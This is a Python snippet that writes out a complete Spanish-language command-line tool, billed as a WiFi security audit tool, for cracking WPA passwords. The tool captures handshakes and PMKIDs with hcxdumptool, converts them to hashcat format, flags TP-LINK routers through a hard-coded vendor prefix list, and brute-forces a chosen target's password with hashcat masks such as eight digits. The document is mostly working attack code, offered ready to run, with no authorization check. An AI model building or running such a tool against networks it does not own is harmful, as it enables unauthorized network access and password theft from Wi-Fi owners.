
# Create an enhanced Python version with better organization
python_script = """#!/usr/bin/env python3
# -*- coding: utf-8 -*-
\"\"\"
WiFi Auditing Automation Tool
Herramienta de automatización para auditorías de seguridad WiFi IEEE 802.11
\"\"\"

import subprocess
import sys
import os
import re
from pathlib import Path
from typing import List, Tuple, Optional

# Colores ANSI
class Colors:
    RED = '\\033[0;31m'
    GREEN = '\\033[0;32m'
    YELLOW = '\\033[1;33m'
    BLUE = '\\033[0;34m'
    CYAN = '\\033[0;36m'
    NC = '\\033[0m'

def print_info(msg: str):
    print(f"{Colors.BLUE}[INFO]{Colors.NC} {msg}")

def print_success(msg: str):
    print(f"{Colors.GREEN}[SUCCESS]{Colors.NC} {msg}")

def print_error(msg: str):
    print(f"{Colors.RED}[ERROR]{Colors.NC} {msg}", file=sys.stderr)

def print_warning(msg: str):
    print(f"{Colors.YELLOW}[WARNING]{Colors.NC} {msg}")

# Lista de OUI de TP-LINK
TPLINK_OUI = [
    '00:31:92', '00:5F:67', '10:27:F5', '14:EB:B6', '1C:61:B4', '20:23:51',
    '24:2F:D0', '28:87:BA', '30:DE:4B', '34:60:F9', '3C:52:A1', '40:ED:00',
    '48:22:54', '50:91:E3', '54:AF:97', '5C:A6:E6', '60:A4:B7', '68:7F:F0',
    '6C:5A:B0', '7C:C2:C6', '80:3C:04', '8C:86:DD', '94:EF:50', '98:25:4A',
    '9C:A2:F4', 'A8:42:A1', 'AC:15:A2', 'B0:A7:B9', 'B4:B0:24', 'C0:06:C3',
    'CC:68:B6', 'D8:F1:2E', 'E0:28:0A', 'E8:48:B8', 'F0:09:0D', 'F0:A7:31',
    'E4:9A:79', '44:D1:FA', '08:57:00', '0C:80:63', '14:CF:92', 'F4:F5:0B'
]

def check_root() -> bool:
    \"\"\"Verifica si el script se ejecuta como root\"\"\"
    if os.geteuid() != 0:
        print_error("Este script requiere privilegios de root (sudo)")
        return False
    return True

def check_dependencies() -> bool:
    \"\"\"Verifica que las herramientas necesarias estén instaladas\"\"\"
    tools = ['hcxdumptool', 'hcxpcapngtool', 'hashcat']
    missing = []
    
    for tool in tools:
        if subprocess.run(['which', tool], capture_output=True).returncode != 0:
            missing.append(tool)
    
    if missing:
        print_error(f"Herramientas faltantes: {', '.join(missing)}")
        print_info("Instalar con: sudo apt install hcxdumptool hcxtools hashcat")
        return False
    
    return True

def is_tplink(mac: str) -> bool:
    \"\"\"Determina si una MAC pertenece a TP-LINK\"\"\"
    mac_prefix = ':'.join(mac.upper().split(':')[:3])
    return mac_prefix in [oui.upper() for oui in TPLINK_OUI]

def stop_services():
    \"\"\"Detiene NetworkManager y wpa_supplicant\"\"\"
    print_info("Deteniendo servicios de red...")
    subprocess.run(['systemctl', 'stop', 'NetworkManager'], 
                   stderr=subprocess.DEVNULL)
    subprocess.run(['systemctl', 'stop', 'wpa_supplicant'], 
                   stderr=subprocess.DEVNULL)

def start_services():
    \"\"\"Inicia NetworkManager y wpa_supplicant\"\"\"
    print_info("Reiniciando servicios de red...")
    subprocess.run(['systemctl', 'start', 'wpa_supplicant'], 
                   stderr=subprocess.DEVNULL)
    subprocess.run(['systemctl', 'start', 'NetworkManager'], 
                   stderr=subprocess.DEVNULL)

def analyze(interface: str, output_file: str) -> bool:
    \"\"\"
    Captura tráfico WiFi y extrae información
    
    Args:
        interface: Interfaz de red WiFi
        output_file: Archivo de salida .pcapng
    \"\"\"
    if not check_root():
        return False
    
    # Verificar interfaz
    result = subprocess.run(['ip', 'link', 'show', interface],
                          capture_output=True)
    if result.returncode != 0:
        print_error(f"La interfaz {interface} no existe")
        return False
    
    print_info(f"Iniciando análisis en {interface}")
    print_info(f"Archivo de salida: {output_file}")
    print_warning("Presiona Ctrl+C para detener la captura")
    
    stop_services()
    
    try:
        # Ejecutar hcxdumptool
        subprocess.run([
            'hcxdumptool',
            '-i', interface,
            '-w', output_file,
            '-F',
            '--rds=1'
        ])
    except KeyboardInterrupt:
        print_info("\\nCaptura detenida por el usuario")
    finally:
        start_services()
    
    if not os.path.exists(output_file):
        print_error("No se generó el archivo de captura")
        return False
    
    # Convertir a formato hashcat
    base_name = output_file.rsplit('.', 1)[0]
    hash_file = f"{base_name}.hc22000"
    essid_file = f"{base_name}.essid"
    mac_file = f"{base_name}.maclist"
    
    print_info("Convirtiendo a formato hashcat...")
    result = subprocess.run([
        'hcxpcapngtool',
        '-o', hash_file,
        '-E', essid_file,
        output_file
    ], capture_output=True, text=True)
    
    if not os.path.exists(hash_file):
        print_error("Error al generar archivo hash")
        return False
    
    # Extraer MACs y SSIDs
    print_info("Extrayendo direcciones MAC y SSIDs...")
    networks = []
    tplink_count = 0
    
    with open(hash_file, 'r') as f:
        for line in f:
            if line.startswith('WPA'):
                parts = line.strip().split('*')
                if len(parts) >= 7:
                    mac = parts[2]
                    essid_hex = parts[5]
                    
                    # Formatear MAC
                    mac_formatted = ':'.join(
                        mac[i:i+2] for i in range(0, len(mac), 2)
                    )
                    
                    # Convertir ESSID de hex a ASCII
                    try:
                        essid = bytes.fromhex(essid_hex).decode('utf-8')
                    except:
                        essid = '<hidden>'
                    
                    # Determinar vendor
                    vendor = 'TP-LINK' if is_tplink(mac_formatted) else 'OTHER'
                    if vendor == 'TP-LINK':
                        tplink_count += 1
                    
                    networks.append((mac_formatted, essid, vendor))
    
    # Guardar lista de MACs
    with open(mac_file, 'w') as f:
        for mac, essid, vendor in networks:
            f.write(f"{mac}:{essid}:{vendor}\\n")
    
    print_success("Captura completada")
    print_info(f"Total de redes: {len(networks)}")
    print_info(f"Redes TP-LINK: {tplink_count}")
    print_info(f"Archivo hash: {hash_file}")
    print_info(f"Lista de MACs: {mac_file}")
    
    return True

def lsmac(mac_file: Optional[str] = None, filter_vendor: Optional[str] = None):
    \"\"\"
    Lista las MACs capturadas
    
    Args:
        mac_file: Archivo .maclist (o None para buscar el más reciente)
        filter_vendor: Filtro por vendor (ej: 'TP-LINK')
    \"\"\"
    if mac_file is None:
        # Buscar el archivo más reciente
        mac_files = sorted(Path('.').glob('*.maclist'), 
                          key=lambda p: p.stat().st_mtime, 
                          reverse=True)
        if not mac_files:
            print_error("No se encontró ningún archivo .maclist")
            print_info("Ejecuta primero el comando 'analyze'")
            return
        mac_file = str(mac_files[0])
        print_info(f"Usando archivo: {mac_file}")
    
    if not os.path.exists(mac_file):
        print_error(f"Archivo no encontrado: {mac_file}")
        return
    
    print()
    print(f"{'MAC ADDRESS':<20} {'SSID':<30} {'VENDOR':<10}")
    print(f"{'-'*20} {'-'*30} {'-'*10}")
    
    count = 0
    with open(mac_file, 'r') as f:
        for line in f:
            parts = line.strip().split(':')
            if len(parts) >= 8:  # MAC tiene 6 partes + SSID + vendor
                mac = ':'.join(parts[:6])
                vendor = parts[-1]
                essid = ':'.join(parts[6:-1])
                
                if filter_vendor is None or filter_vendor in vendor:
                    print(f"{mac:<20} {essid:<30} {vendor:<10}")
                    count += 1
    
    print()
    if filter_vendor:
        print_info(f"Total de redes ({filter_vendor}): {count}")
    else:
        print_info(f"Total de redes: {count}")

def attack(hash_file: str, target_mac: str, mask: str) -> bool:
    \"\"\"
    Ataca una MAC específica con hashcat
    
    Args:
        hash_file: Archivo .hc22000
        target_mac: Dirección MAC objetivo
        mask: Máscara de hashcat (ej: ?d?d?d?d?d?d?d?d)
    \"\"\"
    if not check_root():
        return False
    
    if not os.path.exists(hash_file):
        print_error(f"Archivo no encontrado: {hash_file}")
        return False
    
    # Eliminar separadores de la MAC
    mac_normalized = target_mac.replace(':', '').replace('-', '').lower()
    
    # Extraer hash específico
    target_hash_file = f"hash_{mac_normalized}.hc22000"
    
    with open(hash_file, 'r') as f_in:
        with open(target_hash_file, 'w') as f_out:
            for line in f_in:
                if mac_normalized in line.lower():
                    f_out.write(line)
    
    if os.path.getsize(target_hash_file) == 0:
        print_error(f"No se encontró hash para: {target_mac}")
        os.remove(target_hash_file)
        return False
    
    print_success(f"Hash encontrado para: {target_mac}")
    print_info(f"Máscara: {mask}")
    print_info("Iniciando ataque con hashcat...\\n")
    
    # Ejecutar hashcat
    try:
        subprocess.run([
            'hashcat',
            '-m', '22000',
            target_hash_file,
            '-a', '3',
            mask
        ])
        
        print()
        print_info(f"Para ver contraseñas: hashcat -m 22000 {target_hash_file} --show")
        return True
        
    except KeyboardInterrupt:
        print_warning("\\nAtaque cancelado por el usuario")
        return False

def show_help():
    \"\"\"Muestra la ayuda del programa\"\"\"
    help_text = f\"\"\"
{Colors.CYAN}╔════════════════════════════════════════╗
║  WiFi Auditing Automation Tool        ║
║  IEEE 802.11 Security Analysis         ║
╚════════════════════════════════════════╝{Colors.NC}

{Colors.GREEN}Comandos disponibles:{Colors.NC}

  {Colors.YELLOW}analyze{Colors.NC} <interfaz> <archivo.pcapng>
      Analiza el entorno WiFi y captura paquetes EAPOL
      Ejemplo: analyze wlan0 captura.pcapng

  {Colors.YELLOW}lsmac{Colors.NC} [archivo.maclist] [filtro]
      Lista las MACs y SSIDs capturados
      Ejemplo: lsmac
      Ejemplo: lsmac captura.maclist TP-LINK

  {Colors.YELLOW}attack{Colors.NC} <archivo.hc22000> <mac> <máscara>
      Ataca una MAC con hashcat usando la máscara indicada
      Ejemplo: attack cap.hc22000 AA:BB:CC:DD:EE:FF ?d?d?d?d?d?d?d?d

  {Colors.YELLOW}help{Colors.NC}
      Muestra esta ayuda

{Colors.GREEN}Máscaras de hashcat:{Colors.NC}
  ?l = letras minúsculas (a-z)
  ?u = letras mayúsculas (A-Z)
  ?d = dígitos (0-9)
  ?s = símbolos especiales
  ?a = todos los caracteres

{Colors.GREEN}Ejemplos de máscaras comunes:{Colors.NC}
  ?d?d?d?d?d?d?d?d        - 8 dígitos
  ?u?l?l?l?l?d?d?d?d      - Capital + 4 letras + 4 dígitos
  ?d?d?d?d?d?d?d?d?d?d    - 10 dígitos
\"\"\"
    print(help_text)

def interactive_mode():
    \"\"\"Modo interactivo con prompt\"\"\"
    show_help()
    
    while True:
        try:
            print()
            cmd_input = input(f"{Colors.GREEN}wifi-audit> {Colors.NC}")
            
            if not cmd_input.strip():
                continue
            
            parts = cmd_input.strip().split()
            cmd = parts[0].lower()
            args = parts[1:]
            
            if cmd == 'analyze':
                if len(args) >= 2:
                    analyze(args[0], args[1])
                else:
                    print_error("Uso: analyze <interfaz> <archivo.pcapng>")
            
            elif cmd == 'lsmac':
                if len(args) == 0:
                    lsmac()
                elif len(args) == 1:
                    if os.path.exists(args[0]):
                        lsmac(args[0])
                    else:
                        lsmac(filter_vendor=args[0])
                else:
                    lsmac(args[0], args[1])
            
            elif cmd == 'attack':
                if len(args) >= 3:
                    attack(args[0], args[1], args[2])
                else:
                    print_error("Uso: attack <hash.hc22000> <mac> <máscara>")
            
            elif cmd in ['help', '?']:
                show_help()
            
            elif cmd in ['exit', 'quit', 'q']:
                print_info("Saliendo...")
                break
            
            else:
                print_error(f"Comando desconocido: {cmd}")
                print_info("Escribe 'help' para ver los comandos disponibles")
        
        except KeyboardInterrupt:
            print()
            print_info("Usa 'exit' para salir")
        except EOFError:
            print()
            break

def main():
    \"\"\"Función principal\"\"\"
    if len(sys.argv) == 1:
        # Modo interactivo
        if not check_dependencies():
            sys.exit(1)
        interactive_mode()
    else:
        # Modo comando directo
        cmd = sys.argv[1].lower()
        
        if cmd == 'analyze' and len(sys.argv) >= 4:
            check_dependencies()
            analyze(sys.argv[2], sys.argv[3])
        
        elif cmd == 'lsmac':
            if len(sys.argv) == 2:
                lsmac()
            elif len(sys.argv) == 3:
                lsmac(sys.argv[2])
            else:
                lsmac(sys.argv[2], sys.argv[3])
        
        elif cmd == 'attack' and len(sys.argv) >= 5:
            check_dependencies()
            attack(sys.argv[2], sys.argv[3], sys.argv[4])
        
        elif cmd == 'help':
            show_help()
        
        else:
            print_error("Comando inválido o argumentos insuficientes")
            show_help()
            sys.exit(1)

if __name__ == '__main__':
    main()
"""

with open('/tmp/wifi_audit_tool.py', 'w') as f:
    f.write(python_script)

print("Script de Python guardado en: /tmp/wifi_audit_tool.py")
print("\nCaracterísticas de la versión Python:")
print("- Modo interactivo y modo comando directo")
print("- Manejo robusto de errores")
print("- Código bien documentado y estructurado")
print("- Type hints para mejor mantenibilidad")
print("- Detección automática de archivos más recientes")
